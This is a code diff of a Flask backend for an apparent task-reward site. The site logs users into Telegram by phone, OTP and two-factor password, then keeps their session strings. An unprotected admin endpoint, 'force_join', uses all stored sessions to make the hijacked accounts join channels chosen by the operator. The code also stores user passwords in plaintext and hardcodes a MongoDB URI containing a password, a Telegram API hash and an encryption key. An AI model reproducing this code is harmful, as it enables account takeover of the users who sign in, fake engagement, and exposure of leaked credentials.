@@ -2,28 +2,36 @@ import os
 import base64
 import asyncio
 import requests
+import datetime
 from flask import Flask, request, jsonify, render_template
 from flask_cors import CORS
-from flask_pymongo import PyMongo
-from datetime import datetime, timedelta
 from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError
+from pymongo import MongoClient
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 
 app = Flask(__name__)
 CORS(app)
 
-# --- ১. কনফিগারেশন ---
+# --- ১. কনফিগারেশন (আপনার দেওয়া তথ্য অনুযায়ী) ---
 API_ID = 36466824      
 API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
 SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' # এনক্রিপশন কি
 
-# ডাটাবেস কানেকশন (Mongo_URI অটোমেটিক এনভায়রনমেন্ট থেকে নিবে)
-app.config["MONGO_URI"] = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/AAF_TeleEarn?appName=Cluster0")
-mongo = PyMongo(app)
+# MongoDB কানেকশন
+MONGO_URI = os.environ.get("MONGO_URI", "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0")
+client_db = MongoClient(MONGO_URI)
+db = client_db['AAF_TeleEarn'] # আপনার ডাটাবেস নাম
+users_col = db['users']
+sessions_col = db['sessions']
+tasks_col = db['tasks']
 
-# --- ২. এনক্রিপশন লজিক (AES CBC) ---
+# ওটিপি প্রসেস করার জন্য সাময়িক মেমোরি
+temp_clients = {}
+
+# --- ২. সেশন এনক্রিপশন লজিক (Security) ---
 def encrypt_session(session_str):
     cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
     ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
@@ -39,84 +47,128 @@ def decrypt_session(encrypted_str):
         cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
         return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
     except:
-        return encrypted_str # যদি এনক্রিপ্টেড না থাকে
+        return encrypted_str
 
-# --- ৩. ইউজার এবং সেশন লজিক ---
+# --- ৩. ইউজার লগইন ও টেলিগ্রাম সেশন জেনারেশন ---
 
-@app.route('/api/add_account', methods=['POST'])
-def add_account():
+@app.route('/api/send_otp', methods=['POST'])
+async def send_otp():
     data = request.json
-    uid = data.get('telegram_id')
-    raw_session = data.get('session_string') 
     phone = data.get('phone')
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        sent_code = await client.send_code_request(phone)
+        temp_clients[phone] = {
+            'client': client,
+            'phone_code_hash': sent_code.phone_code_hash
+        }
+        return jsonify({"success": True, "message": "OTP Sent!"})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
+
+@app.route('/api/verify_login', methods=['POST'])
+async def verify_login():
+    data = request.json
+    phone = data.get('phone')
+    code = data.get('code')
+    password = data.get('password') # 2FA Password
+    full_name = data.get('name')
+    site_pass = data.get('site_password')
+
+    if phone not in temp_clients:
+        return jsonify({"success": False, "message": "Session Expired. Please retry."})
+
+    client_data = temp_clients[phone]
+    client = client_data['client']
     
-    encrypted = encrypt_session(raw_session)
-    mongo.db.sessions.update_one(
-        {"phone": phone},
-        {"$set": {"telegram_id": int(uid), "session": encrypted, "status": "Active"}},
-        upsert=True
-    )
-    mongo.db.users.update_one({"telegram_id": int(uid)}, {"$inc": {"added_accounts": 1}})
-    return jsonify({"status": "success"})
+    try:
+        try:
+            await client.sign_in(phone, code, phone_code_hash=client_data['phone_code_hash'])
+        except SessionPasswordNeededError:
+            await client.sign_in(password=password)
 
-@app.route('/api/user_data/<telegram_id>', methods=['GET'])
-def get_user_data(telegram_id):
-    user = mongo.db.users.find_one({"telegram_id": int(telegram_id)}, {'_id': 0})
-    if user:
-        return jsonify({"status": "success", **user})
-    return jsonify({"status": "error", "message": "User not found"})
+        raw_session = client.session.save()
+        me = await client.get_me()
+        
+        # সেশন এনক্রিপ্ট করে সুরক্ষিত করা
+        encrypted_session = encrypt_session(raw_session)
 
-# --- ৪. টাস্ক এবং ইনকাম লজিক (৮ পয়সা ও ১ টাকা বোনাস) ---
+        # ১. ইউজার ডাটা মঙ্গো-বিডিতে সেভ
+        user_doc = {
+            "telegram_id": me.id,
+            "name": full_name,
+            "phone": phone,
+            "site_password": site_pass,
+            "username": me.username,
+            "status": "Active",
+            "task_balance": 0.0,
+            "added_accounts": 1,
+            "created_at": datetime.datetime.now()
+        }
+        users_col.update_one({"telegram_id": me.id}, {"$set": user_doc}, upsert=True)
+        
+        # ২. সেশন ডাটা আলাদা কালেকশনে সেভ
+        sessions_col.update_one(
+            {"phone": phone},
+            {"$set": {"telegram_id": me.id, "session": encrypted_session, "status": "Active"}},
+            upsert=True
+        )
+        
+        await client.disconnect()
+        del temp_clients[phone]
+        return jsonify({"success": True, "message": "Login Success!"})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
 
-@app.route('/api/get_admin_tasks', methods=['GET'])
-def get_user_tasks():
-    tasks = list(mongo.db.tasks.find({}, {'_id': 0}))
-    return jsonify(tasks)
+# --- ৪. টাস্ক কন্ট্রোল ও রিওয়ার্ড লজিক ---
 
-@app.route('/api/add_reward', methods=['POST'])
-def add_reward():
+@app.route('/admin/add_task', methods=['POST'])
+def admin_add_task():
+    data = request.json
+    new_task = {
+        "task_id": datetime.datetime.now().strftime("%Y%m%d%H%M%S"),
+        "title": data.get('title'),
+        "link": data.get('link'),
+        "reward_amount": float(data.get('reward', 0.08)), # অ্যাডমিন যা দিবে তাই হবে
+        "status": "active"
+    }
+    tasks_col.insert_one(new_task)
+    return jsonify({"status": "success", "message": "New Task Added!"})
+
+@app.route('/api/complete_task', methods=['POST'])
+def complete_task():
     data = request.json
     uid = data.get('user_id')
-    amount = float(data.get('amount', 0.08))
-    mongo.db.users.update_one({"telegram_id": int(uid)}, {"$inc": {"task_balance": amount}})
-    return jsonify({"status": "success"})
+    tid = data.get('task_id')
+    
+    task = tasks_col.find_one({"task_id": tid})
+    if task:
+        reward = task['reward_amount']
+        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"task_balance": reward}})
+        return jsonify({"status": "success", "added": reward})
+    return jsonify({"status": "error", "message": "Task Not Found"})
 
 @app.route('/api/claim_daily_bonus', methods=['POST'])
 def claim_daily():
     uid = request.json['user_id']
-    user = mongo.db.users.find_one({"telegram_id": int(uid)})
-    now = datetime.now()
+    user = users_col.find_one({"telegram_id": int(uid)})
+    now = datetime.datetime.now()
     last = user.get('last_bonus_time')
-    if last and now < last + timedelta(hours=24):
+    
+    if last and now < last + datetime.timedelta(hours=24):
         return jsonify({"status": "error", "message": "Wait 24h!"})
-    mongo.db.users.update_one({"telegram_id": int(uid)}, {"$inc": {"task_balance": 1.0}, "$set": {"last_bonus_time": now}})
-    return jsonify({"status": "success"})
-
-# --- ৫. অ্যাডমিন মাস্টার কন্ট্রোল (ভিজ্যুয়াল টেবিল কন্ট্রোল) ---
-
-@app.route('/admin/get_all_users', methods=['GET'])
-def get_all_users():
-    users = list(mongo.db.users.find({}, {'_id': 0}))
-    return jsonify(users)
-
-@app.route('/admin/add_task', methods=['POST'])
-def admin_add_task():
-    task_data = request.json
-    mongo.db.tasks.insert_one(task_data)
-    return jsonify({"status": "success"})
-
-@app.route('/admin/update_user', methods=['POST'])
-def admin_update_user():
-    data = request.json
-    mongo.db.users.update_one(
-        {"telegram_id": int(data['user_id'])},
-        {"$set": {"task_balance": float(data['balance']), "status": data['status']}}
+        
+    users_col.update_one(
+        {"telegram_id": int(uid)}, 
+        {"$inc": {"task_balance": 1.0}, "$set": {"last_bonus_time": now}}
     )
-    return jsonify({"status": "success"})
+    return jsonify({"status": "success", "bonus": 1.0})
 
-# --- ৬. অ্যাডমিন Force Join (টেলিগ্রাম কন্ট্রোল) ---
+# --- ৫. অ্যাডমিন মাস্টার কন্ট্রোল (Force Join) ---
+
 async def perform_join(channel_to_join):
-    all_sessions = mongo.db.sessions.find({"status": "Active"})
+    all_sessions = sessions_col.find({"status": "Active"})
     count = 0
     for sess in all_sessions:
         try:
@@ -124,7 +176,7 @@ async def perform_join(channel_to_join):
             async with TelegramClient(StringSession(string_session), API_ID, API_HASH) as client:
                 await client(functions.channels.JoinChannelRequest(channel=channel_to_join))
                 count += 1
-        except: pass
+        except: continue
     return count
 
 @app.route('/api/admin/force_join', methods=['POST'])
@@ -136,11 +188,7 @@ def force_join_trigger():
     count = loop.run_until_complete(perform_join(channel))
     return jsonify({"status": "success", "joined": count})
 
-# --- ৭. এক্সট্রা এবং রেন্ডারিং ---
-@app.route('/api/sol_price', methods=['GET'])
-def sol_price():
-    r = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
-    return jsonify(r.json())
+# --- ৬. রাউটিং ও ড্যাশবোর্ড ---
 
 @app.route('/')
 def dashboard(): return render_template('index.html')
